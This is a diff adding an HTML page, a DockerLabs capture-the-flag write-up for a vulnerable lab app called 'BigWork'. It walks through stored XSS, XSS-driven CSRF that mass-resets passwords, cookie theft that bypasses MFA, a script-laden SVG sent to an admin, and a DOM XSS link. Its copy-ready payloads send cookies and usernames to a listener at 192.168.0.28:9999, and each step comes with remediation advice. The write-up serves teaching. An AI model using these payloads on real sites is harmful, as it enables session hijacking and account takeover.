+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">SPY SERVER</span>
+                    <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-m</span> <span
+                                class="arg">http.server 9999</span></span></div>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd='<img src=x onerror="fetch(&apos;http://192.168.0.28:9999/xss-test&apos;)">'>
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">XSS PAYLOAD</span>
+                    <div><span class="comment"># Inject as a comment:</span></div>
+                    <div><span class="cmd">&lt;img src=x onerror="fetch('http://192.168.0.28:9999/xss-test')"&gt;</span>
+                    </div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="comment"># Spy server output — incoming requests from victims:</span></div>
+                    <div><span class="o-ok">GET /xss-test HTTP/1.1 — 172.17.0.2</span></div>
+                    <div><span class="o-ok">GET /xss-test HTTP/1.1 — 172.17.0.3</span></div>
+                    <div><span class="o-ok">✅ Stored XSS confirmed active — every viewer triggers the payload.</span>
+                    </div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">3</div>
+                    <span class="step-title">Harvest victim usernames and roles</span>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd='<img src=x onerror="fetch(&apos;/api/me&apos;).then(r=>r.json()).then(d=>new Image().src=&apos;http://192.168.0.28:9999/recon?user=&apos;+d.username+&apos;&role=&apos;+d.role)">'>
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">RECON PAYLOAD</span>
+                    <div><span class="cmd">&lt;img src=x onerror="fetch('/api/me').then(r=&gt;r.json()).then(d=&gt;new
+                            Image().src='http://192.168.0.28:9999/recon?user='+d.username+'&amp;role='+d.role)"&gt;</span>
+                    </div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="o-warn">GET /recon?user=patricia_navarro_19&role=user</span></div>
+                    <div><span class="o-warn">GET /recon?user=roberto_sanchez_35&role=user</span></div>
+                    <div><span class="o-accent">GET /recon?user=carlos_vega&role=user</span></div>
+                </div>
+
+                <div class="warn-box">
+                    <p class="warn-box-title">// Remediation</p>
+                    <p>
+                        Implement <strong>server-side output encoding</strong> for all user-generated content
+                        using a library such as DOMPurify or Python's <code>markupsafe</code>. Apply a strict
+                        <strong>Content Security Policy</strong>: <code>default-src 'self'; script-src 'self'</code>
+                        to prevent inline script execution. Treat all input surfaces with equal sanitisation
+                        rigour — the asymmetry between posts and comments was the root cause here.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="vuln02">
+                <p class="section-label">// 03</p>
+                <h2 class="section-title">VULN-02 · CSRF — Password Change</h2>
+                <div class="section-line"></div>
+
+                <table class="vuln-meta-table">
+                    <tr>
+                        <td>Component</td>
+                        <td>BigWork — <code>/user/change-password</code> endpoint</td>
+                    </tr>
+                    <tr>
+                        <td>Type</td>
+                        <td>Cross-Site Request Forgery (CSRF) + Insecure Design</td>
+                    </tr>
+                    <tr>
+                        <td>OWASP</td>
+                        <td>A01:2021 – Broken Access Control / A04:2021 – Insecure Design</td>
+                    </tr>
+                    <tr>
+                        <td>CVSSv3</td>
+                        <td style="color:var(--warn)">High</td>
+                    </tr>
+                    <tr>
+                        <td>Prerequisite</td>
+                        <td>VULN-01 (active Stored XSS)</td>
+                    </tr>
+                </table>
+
+                <div class="prose">
+                    <p>
+                        The password-change endpoint accepts a <code>POST</code> request with only the
+                        <code>new_password</code> field — it does <strong>not</strong> require the current
+                        password. Combined with the active Stored XSS, an attacker can inject a JavaScript
+                        payload that silently sends this POST on behalf of every authenticated viewer, effectively
+                        <span class="hl-bad">changing the passwords of all users</span> without their knowledge.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">4</div>
+                    <span class="step-title">Mass password change via XSS-driven CSRF</span>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd='<img src=x onerror="fetch(&apos;/user/change-password&apos;,{method:&apos;POST&apos;,headers:{&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;},body:&apos;new_password=hacked123&apos;})">'>
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">CSRF PAYLOAD</span>
+                    <div><span class="cmd">&lt;img src=x
+                            onerror="fetch('/user/change-password',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'new_password=hacked123'})"&gt;</span>
+                    </div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="o-ok">✅ Every user who views the post has their password silently changed to
+                            "hacked123".</span></div>
+                </div>
+
+                <div class="warn-box">
+                    <p class="warn-box-title">// Remediation</p>
+                    <p>
+                        <strong>Always require the current password</strong> before allowing a password change.
+                        Implement and validate <strong>CSRF tokens</strong> (synchronizer token pattern) on all
+                        state-changing endpoints. Set <code>SameSite=Strict</code> or <code>SameSite=Lax</code>
+                        on session cookies. Apply <strong>rate limiting</strong> on the endpoint to detect
+                        automated abuse.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="vuln03">
+                <p class="section-label">// 04</p>
+                <h2 class="section-title">VULN-03 · Session Hijacking</h2>
+                <div class="section-line"></div>
+
+                <table class="vuln-meta-table">
+                    <tr>
+                        <td>Component</td>
+                        <td>BigWork — Session Cookie Configuration</td>
+                    </tr>
+                    <tr>
+                        <td>Type</td>
+                        <td>Session Hijacking / Insecure Cookie Attribute</td>
+                    </tr>
+                    <tr>
+                        <td>OWASP</td>
+                        <td>A02:2021 – Cryptographic Failures / A07:2021 – Auth Failures</td>
+                    </tr>
+                    <tr>
+                        <td>CVSSv3</td>
+                        <td style="color:var(--danger)">Critical</td>
+                    </tr>
+                    <tr>
+                        <td>Prerequisite</td>
+                        <td>VULN-01 (active Stored XSS)</td>
+                    </tr>
+                </table>
+
+                <div class="prose">
+                    <p>
+                        The application's session cookie (<code>session_id</code>) is configured with
+                        <strong>HttpOnly: false</strong>. This means client-side JavaScript can read the
+                        cookie via <code>document.cookie</code>. Combined with the Stored XSS, an attacker
+                        can exfiltrate any victim's session token, <span class="hl-bad">completely bypassing
+                            MFA</span> — because the stolen cookie represents an already-authenticated session,
+                        and the MFA challenge is only triggered at login time.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">5</div>
+                    <span class="step-title">Steal session cookies via XSS</span>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd='<img src=x onerror="new Image().src=&apos;http://192.168.0.28:9999/steal?cookie=&apos;+document.cookie">'>
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">COOKIE STEAL</span>
+                    <div><span class="cmd">&lt;img src=x onerror="new
+                            Image().src='http://192.168.0.28:9999/steal?cookie='+document.cookie"&gt;</span></div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="comment"># Spy server receives:</span></div>
+                    <div><span class="o-ok">GET /steal?cookie=session_id=13dde2ee-6f89-4813-b2c6-291fda0e6fc4
+                            HTTP/1.1</span></div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">6</div>
+                    <span class="step-title">Inject stolen cookie — bypass MFA</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        Open DevTools in the browser, navigate to <strong>Application → Storage → Cookies →
+                            http://172.17.0.2:8000</strong>, edit the <code>session_id</code> value and paste
+                        the stolen token. Reload the page — we are now logged in as
+                        <span class="hl">carlos_vega</span> without knowing the password or the 4-digit
+                        MFA PIN.
+                    </p>
+                </div>
+
+                <div class="warn-box">
+                    <p class="warn-box-title">// Remediation</p>
+                    <p>
+                        Set <strong>HttpOnly=true</strong> on all session cookies — this single control prevents
+                        JavaScript from ever reading cookie values, making XSS-based session theft impossible.
+                        Additionally set <code>Secure=true</code> to prevent cookie transmission over plain HTTP.
+                        Implement session binding tied to IP and User-Agent, and fix the underlying XSS.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="vuln04">
+                <p class="section-label">// 05</p>
+                <h2 class="section-title">VULN-04 · XSS via SVG Upload</h2>
+                <div class="section-line"></div>
+
+                <table class="vuln-meta-table">
+                    <tr>
+                        <td>Component</td>
+                        <td>BigWork — Chat File Upload Feature</td>
+                    </tr>
+                    <tr>
+                        <td>Type</td>
+                        <td>Stored XSS via Unrestricted File Upload (SVG)</td>
+                    </tr>
+                    <tr>
+                        <td>OWASP</td>
+                        <td>A03:2021 – Injection / A04:2021 – Insecure Design</td>
+                    </tr>
+                    <tr>
+                        <td>CVSSv3</td>
+                        <td style="color:var(--warn)">High</td>
+                    </tr>
+                    <tr>
+                        <td>Prerequisite</td>
+                        <td>VULN-03 (access to carlos_vega account)</td>
+                    </tr>
+                </table>
+
+                <div class="prose">
+                    <p>
+                        The chat system allows users to send image files. The application does not validate the
+                        actual content of uploaded files, nor does it block SVG files. The SVG format is
+                        XML-based and <strong>natively supports embedded <code>&lt;script&gt;</code> tags</strong>.
+                        When a recipient opens a malicious SVG directly in the browser, the embedded JavaScript
+                        executes in the application's origin context, enabling cookie theft against administrator
+                        accounts.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">7</div>
+                    <span class="step-title">Create and send malicious SVG to admin (Sofía)</span>
+                </div>
+
+                <div class="cmd-block" data-cmd="cat foto.svg">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">foto.svg</span>
+                    <div><span class="comment"># foto.svg — sent to Sofía Martínez (admin) via chat:</span></div>
+                    <div><span class="cmd">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></div>
+                    <div><span class="cmd">&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100"&gt;</span>
+                    </div>
+                    <div><span class="cmd"> &lt;text x="10" y="50" font-size="12"&gt;Security Report Q4
+                            2026&lt;/text&gt;</span></div>
+                    <div><span class="cmd"> &lt;script type="text/javascript"&gt;</span></div>
+                    <div><span class="arg"> new
+                            Image().src='http://192.168.0.28:9999/admin?cookie='+document.cookie;</span></div>
+                    <div><span class="cmd"> &lt;/script&gt;</span></div>
+                    <div><span class="cmd">&lt;/svg&gt;</span></div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="comment"># Sofía (simulated by a bot) opens the file — spy server receives:</span>
+                    </div>
+                    <div><span class="o-ok">GET /admin?cookie=session_id=13dde2ee-6f89-4813-b2c6-291fda0e6fc4
+                            HTTP/1.1</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-ok">✅ Inject Sofía's cookie → access /admin-panel as admin.</span></div>
+                </div>
+
+                <div class="warn-box">
+                    <p class="warn-box-title">// Remediation</p>
+                    <p>
+                        <strong>Whitelist allowed file types</strong> strictly — if SVG is not required, block it.
+                        If images are needed, only allow JPEG and PNG. <strong>Re-encode uploaded images</strong>
+                        server-side (e.g., using Pillow in Python) to strip any embedded metadata or scripts.
+                        Serve uploaded files from a <strong>separate isolated domain</strong> with no application
+                        cookies so any injected script cannot access session tokens.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="vuln05">
+                <p class="section-label">// 06</p>
+                <h2 class="section-title">VULN-05 · DOM XSS via URL Parameter</h2>
+                <div class="section-line"></div>
+
+                <table class="vuln-meta-table">
+                    <tr>
+                        <td>Component</td>
+                        <td>BigWork Admin Panel — Search (<code>?q=</code> parameter)</td>
+                    </tr>
+                    <tr>
+                        <td>Type</td>
+                        <td>DOM-Based Cross-Site Scripting (Reflected)</td>
+                    </tr>
+                    <tr>
+                        <td>OWASP</td>
+                        <td>A03:2021 – Injection</td>
+                    </tr>
+                    <tr>
+                        <td>CVSSv3</td>
+                        <td style="color:var(--warn)">High</td>
+                    </tr>
+                    <tr>
+                        <td>Prerequisite</td>
+                        <td>VULN-04 (access to admin panel)</td>
+                    </tr>
+                </table>
+
+                <div class="prose">
+                    <p>
+                        The admin panel reflects the value of the <code>?q=</code> URL query parameter
+                        <strong>directly into the DOM without sanitisation</strong>. While server-side XSS
+                        filters block common payloads such as <code>&lt;script&gt;</code> tags, the application
+                        does <strong>not filter the <code>onfocus</code> event attribute</strong>. An attacker
+                        can craft a URL containing an <code>&lt;input&gt;</code> element with an
+                        <code>onfocus</code> handler and the <code>autofocus</code> attribute, which causes
+                        the injected code to execute automatically as soon as the page loads — no user
+                        interaction required beyond clicking the link.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">8</div>
+                    <span class="step-title">Confirm DOM XSS — alert proof of concept</span>
+                </div>
+
+                <div class="cmd-block" data-cmd='/?q=<input onfocus="alert(1)" autofocus>'>
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">DOM XSS POC</span>
+                    <div><span class="cmd">/?q=&lt;input onfocus="alert(1)" autofocus&gt;</span></div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="o-ok">✅ Alert fires immediately on page load — DOM XSS confirmed.</span></div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">9</div>
+                    <span class="step-title">Craft exploit URL — steal CEO session</span>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd="http://192.168.0.28:9000/?%20q=%3Cinput%20onfocus%3D%22fetch('http://192.168.0.28:9999/admin?cookie='+document.cookie)%22%20autofocus%3E">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">EXPLOIT URL</span>
+                    <div><span class="comment"># Send this URL in the admin chat — CEO bot clicks it:</span></div>
+                    <div><span
+                            class="cmd">http://192.168.0.28:9000/?%20q=%3Cinput%20onfocus%3D%22fetch('http://192.168.0.28:9999/admin?cookie='+document.cookie)%22%20autofocus%3E</span>
+                    </div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="comment"># Spy server receives CEO's session cookie:</span></div>
+                    <div><span class="o-ok">GET /admin?cookie=session_id=d7de81b8-a6e7-4687-ad7f-228b5efe65f
+                            HTTP/1.1</span></div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-ok">✅ Inject CEO cookie → navigate to /treasury → PWNED.</span></div>
+                </div>
+
+                <div class="warn-box">
+                    <p class="warn-box-title">// Remediation</p>
+                    <p>
+                        <strong>Never reflect raw URL parameters into the DOM.</strong> Use <code>textContent</code>
+                        instead of <code>innerHTML</code>, or a trusted sanitisation library. Extend XSS filters to
+                        cover <strong>all event handler attributes</strong> (<code>onfocus</code>,
+                        <code>onmouseover</code>, <code>oninput</code>, etc.) — not just <code>&lt;script&gt;</code>
+                        tags. Implement a strong <strong>Content Security Policy</strong>:
+                        <code>script-src 'self'</code>
+                        to block inline event handler execution. Treat internal admin panels with the same security
+                        rigour as public-facing interfaces.
+                    </p>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="walkthrough">
+                <p class="section-label">// 07</p>
+                <h2 class="section-title">Full Walkthrough</h2>
+                <div class="section-line"></div>
+
+                <div class="prose">
+                    <p>
+                        This section consolidates the complete exploitation chain in sequential order from
+                        initial deployment to treasury access.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">1</div>
+                    <span class="step-title">Deploy the lab</span>
+                </div>
+
+                <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh bigwork.tar">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">DEPLOY</span>
+                    <div><span class="prompt">$ </span><span class="cmd">sudo bash <span
+                                class="arg">auto_deploy.sh</span> <span class="arg">bigwork.tar</span></span></div>
+                </div>
+
+                <div class="output-block">
+                    <div class="o-ok">Machine deployed, its IP address is ——> <strong>172.17.0.2</strong></div>
+                    <div>Access the app at: <span class="o-accent">http://172.17.0.2:8000</span></div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">2</div>
+                    <span class="step-title">Register attacker account and start spy server</span>
+                </div>
+
+                <div class="cmd-block" data-cmd="python3 -m http.server 9999">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">SPY SERVER</span>
+                    <div><span class="comment"># Register as "pingu" at http://172.17.0.2:8000/register</span></div>
+                    <div><span class="prompt">$ </span><span class="cmd">python3 <span class="flag">-m</span> <span
+                                class="arg">http.server 9999</span></span></div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">3</div>
+                    <span class="step-title">Inject recon + CSRF + cookie-steal payloads as comments</span>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd='<img src=x onerror="fetch(&apos;/api/me&apos;).then(r=>r.json()).then(d=>new Image().src=&apos;http://192.168.0.28:9999/recon?user=&apos;+d.username+&apos;&role=&apos;+d.role)">'>
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">STEP A — RECON</span>
+                    <div><span class="cmd">&lt;img src=x onerror="fetch('/api/me').then(r=&gt;r.json()).then(d=&gt;new
+                            Image().src='http://192.168.0.28:9999/recon?user='+d.username+'&amp;role='+d.role)"&gt;</span>
+                    </div>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd='<img src=x onerror="fetch(&apos;/user/change-password&apos;,{method:&apos;POST&apos;,headers:{&apos;Content-Type&apos;:&apos;application/x-www-form-urlencoded&apos;},body:&apos;new_password=hacked123&apos;})">'>
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">STEP B — CSRF</span>
+                    <div><span class="cmd">&lt;img src=x
+                            onerror="fetch('/user/change-password',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'new_password=hacked123'})"&gt;</span>
+                    </div>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd='<img src=x onerror="new Image().src=&apos;http://192.168.0.28:9999/steal?cookie=&apos;+document.cookie">'>
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">STEP C — COOKIE STEAL</span>
+                    <div><span class="cmd">&lt;img src=x onerror="new
+                            Image().src='http://192.168.0.28:9999/steal?cookie='+document.cookie"&gt;</span></div>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">4</div>
+                    <span class="step-title">Inject carlos_vega's cookie → access account (MFA bypassed)</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        From spy server output, copy the stolen <code>session_id</code>. Open DevTools
+                        (<strong>Application → Cookies → http://172.17.0.2:8000</strong>), edit the
+                        <code>session_id</code> value, paste the stolen token, and reload the page.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">5</div>
+                    <span class="step-title">Send malicious SVG to admin → escalate to admin panel</span>
+                </div>
+
+                <div class="prose">
+                    <p>
+                        As carlos_vega, open the chat with <span class="hl">Sofía Martínez</span> (admin).
+                        Upload <code>foto.svg</code> (the malicious SVG from VULN-04) via the file attachment
+                        button. The bot opens it → admin cookie captured in the spy server.
+                        Inject Sofía's cookie via DevTools → access <code>/admin-panel</code>.
+                    </p>
+                </div>
+
+                <div class="step-marker">
+                    <div class="step-num">6</div>
+                    <span class="step-title">Send DOM XSS link in admin chat → capture CEO session</span>
+                </div>
+
+                <div class="cmd-block"
+                    data-cmd="http://192.168.0.28:9000/?%20q=%3Cinput%20onfocus%3D%22new%20Image().src%3D'http%3A%2F%2F192.168.0.28%3A9999%2Fadmin%3Fcookie%3D'%2Bdocument.cookie%22%20autofocus%3E">
+                    <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+                    <span class="cmd-label">DOM XSS LINK</span>
+                    <div><span class="comment"># Paste this link in the Administrators Chat:</span></div>
+                    <div><span
+                            class="cmd">http://192.168.0.28:9000/?%20q=%3Cinput%20onfocus%3D%22new%20Image().src%3D'http%3A%2F%2F192.168.0.28%3A9999%2Fadmin%3Fcookie%3D'%2Bdocument.cookie%22%20autofocus%3E</span>
+                    </div>
+                </div>
+
+                <div class="output-block">
+                    <div><span class="comment"># CEO bot (elena_rodriguez) clicks the link → autofocus triggers
+                            payload:</span></div>
+                    <div><span class="o-bad">GET /admin?cookie=session_id=d7de81b8-a6e7-4687-ad7f-228b5efe65f</span>
+                    </div>
+                    <div>&nbsp;</div>
+                    <div><span class="o-ok">✅ Inject CEO cookie → navigate to /treasury</span></div>
+                    <div><span class="o-ok">🏆 MISSION COMPLETE — full company treasury access.</span></div>
+                </div>
+            </div>
+
+            <hr class="divider">
+
+            <div class="section" id="glossary">
+                <p class="section-label">// 08</p>
+                <h2 class="section-title">Glossary</h2>
+                <div class="section-line"></div>
+
+                <div class="glos-grid">
+
+                    <div class="glos-card">
+                        <div class="glos-term">Stored XSS — Persistent Cross-Site Scripting</div>
+                        <div class="glos-def">
+                            <strong>Stored XSS</strong> occurs when malicious JavaScript is saved to the server's
+                            database and later rendered in victims' browsers. Unlike Reflected XSS (which requires
+                            a victim to click a specially crafted link), Stored XSS fires automatically for every
+                            user who views the compromised page. It is classified under
+                            <strong>OWASP A03:2021 – Injection</strong>. Mitigations include server-side output
+                            encoding, Content Security Policy (CSP), and input validation on all user-controlled
+                            surfaces. The key distinction is that the payload is persistent —
+                            <strong>once injected, no further attacker action is needed.</strong>
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">CSRF — Cross-Site Request Forgery</div>
+                        <div class="glos-def">
+                            <strong>CSRF</strong> is an attack where a malicious website or script causes a
+                            victim's browser to make an unintended request to a different site where the victim
+                            is authenticated. In this case, the XSS payload directly sends a POST request to
+                            the same domain, making CSRF tokens alone insufficient without first fixing the
+                            underlying XSS. Standard CSRF defences include: synchronizer tokens (CSRF tokens),
+                            <code>SameSite=Strict</code> cookie attribute, <code>Origin</code> and
+                            <code>Referer</code> header validation, and requiring the current password for
+                            sensitive operations.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">HttpOnly Cookie Attribute</div>
+                        <div class="glos-def">
+                            The <strong>HttpOnly</strong> flag, when set on a cookie, instructs the browser to
+                            prevent JavaScript from accessing the cookie value via <code>document.cookie</code>.
+                            This is one of the most impactful single security controls available for web
+                            applications: it makes XSS-based session hijacking impossible, since the attacker's
+                            injected script cannot read the session token. It does not protect against all XSS
+                            attack vectors (e.g., DOM manipulation or CSRF-via-XSS still work), so it should
+                            be combined with a robust CSP and input sanitisation. The complementary
+                            <strong>Secure</strong> flag prevents transmission of the cookie over unencrypted
+                            HTTP connections.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">DOM XSS — Document Object Model Cross-Site Scripting</div>
+                        <div class="glos-def">
+                            <strong>DOM XSS</strong> is a variant of XSS where the vulnerability exists in
+                            client-side code rather than server-side rendering. The attack payload is injected
+                            via a URL parameter or fragment, read by JavaScript (e.g., using
+                            <code>location.search</code> or <code>location.hash</code>), and written into the
+                            DOM via unsafe sinks such as <code>innerHTML</code> or <code>document.write</code>.
+                            In BigWork, the admin panel reads <code>?q=</code> and injects it into the page
+                            without encoding. The <code>autofocus</code> attribute on an injected
+                            <code>&lt;input&gt;</code> element triggers the <code>onfocus</code> handler
+                            automatically on page load — no click required.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">SVG — Scalable Vector Graphics as an Attack Vector</div>
+                        <div class="glos-def">
+                            <strong>SVG</strong> files are XML-based vector graphics that natively support
+                            embedded <code>&lt;script&gt;</code> tags, event handlers (e.g.,
+                            <code>onload</code>), and external resource references. When an SVG file is served
+                            directly from the web application's domain and opened in a browser, any embedded
+                            JavaScript executes in the origin's context — with full access to cookies and the
+                            DOM. Applications that allow SVG uploads without sanitisation or content-type
+                            checking are vulnerable to this vector. Defences include: whitelisting safe image
+                            formats (JPEG, PNG), sanitising SVG server-side, serving user uploads from a
+                            separate cookieless domain, and setting a strict CSP.
+                        </div>
+                    </div>
+
+                    <div class="glos-card">
+                        <div class="glos-term">Content Security Policy (CSP)</div>
+                        <div class="glos-def">
+                            <strong>CSP</strong> is an HTTP response header that instructs the browser which
+                            sources of content (scripts, styles, images, frames) are allowed to be loaded and
+                            executed. A strict CSP such as <code>Content-Security-Policy: default-src 'self';
+                            script-src 'self'</code> blocks inline scripts and event handlers, neutralising
+                            virtually all XSS payloads even if they are injected into the page. CSP is a
+                            defence-in-depth measure — it does not replace input sanitisation, but it
+                            dramatically reduces the impact of any sanitisation failures that slip through.
+                            All five vulnerabilities in BigWork would have been significantly mitigated or
+                            rendered unexploitable with a properly configured CSP.
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <footer>
+        © Designed & Built by <em>Fran</em> — BigWork · DockerLabs Write-up · April 2026
+    </footer>
+
+    <script>
+        const navEl = document.getElementById('nav');
+        window.addEventListener('scroll', () => {
+            navEl.style.borderBottomColor = scrollY > 30
+                ? 'rgba(0,210,255,0.1)' : 'rgba(0,210,255,0.07)';
+        }, { passive: true });
+
+        window.addEventListener('scroll', () => {
+            const winScroll = document.documentElement.scrollTop;
+            const height = document.documentElement.scrollHeight - window.innerHeight;
+            const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+            document.getElementById('readingProgress').style.width = scrolled + '%';
+        }, { passive: true });
+
+        const sections = document.querySelectorAll('.section[id]');
+        const tocLinks = document.querySelectorAll('.toc-list a');
+        const tocObserver = new IntersectionObserver(entries => {
+            entries.forEach(e => {
+                if (e.isIntersecting) {
+                    tocLinks.forEach(a => a.classList.remove('active'));
+                    const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+                    if (active) active.classList.add('active');
+                }
+            });
+        }, { rootMargin: '-20% 0px -65% 0px' });
+        sections.forEach(s => tocObserver.observe(s));
+
+        const obs = new IntersectionObserver(entries => {
+            entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+        }, { threshold: 0.06 });
+        document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+        function showToast(msg) {
+            let toast = document.querySelector('.toast');
+            if (!toast) {
+                toast = document.createElement('div');
+                toast.className = 'toast';
+                document.body.appendChild(toast);
+            }
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+
+        function copyCmd(btn) {
+            const block = btn.closest('.cmd-block');
+            const cmd = block.dataset.cmd || '';
+            if (!cmd) return;
+            navigator.clipboard.writeText(cmd).then(() => {
+                btn.textContent = '✓';
+                btn.classList.add('copied');
+                showToast('Command copied ✓');
+                setTimeout(() => {
+                    btn.textContent = 'COPY';
+                    btn.classList.remove('copied');
+                }, 1800);
+            }).catch(() => showToast('Copy error'));
+        }
+    </script>
+
+</body>
+
+</html>
